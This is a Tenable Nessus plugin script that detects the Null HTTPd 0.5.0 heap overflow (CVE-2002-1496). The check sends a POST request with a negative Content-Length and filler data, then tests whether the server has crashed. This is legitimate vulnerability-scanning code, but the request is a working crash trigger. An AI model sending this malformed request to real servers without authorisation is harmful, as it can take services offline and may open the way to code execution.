#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
#
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
#
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#

include("compat.inc");

if (description)
{
  script_id(11183);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/10/27 15:14:57 $");

  script_cve_id("CVE-2002-1496");
  script_bugtraq_id(5774);
  script_osvdb_id(9212);

  script_name(english:"Null httpd Content-Length Header Handling Remote Overflow");
  script_summary(english:"NullLogic Null HTTP Server Negative Content-Length Heap Overflow");

  script_set_attribute(attribute:"synopsis", value:"The remote service is prone to a heap based buffer overflow.");
  script_set_attribute(attribute:"description", value:
"The NullLogic Null HTTPd web server crashed when sent an invalid POST
HTTP request with a negative Content-Length field.

An attacker may exploit this flaw to disable your service or even
execute arbitrary code on your system.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Sep/233");
  script_set_attribute(attribute:"solution", value:"Upgrade your NullLogic Null HTTPd to version 0.5.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/09/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/12/02");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");

  script_dependencie("http_version.nasl", "httpver.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www",80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

w = http_send_recv3(port: port, item: "/", method:"POST",
  add_headers: make_array("Content-Length", "-800"), data: crap(500));

#
if(http_is_dead(port: port, retry: 3))
{
  security_hole(port);
}
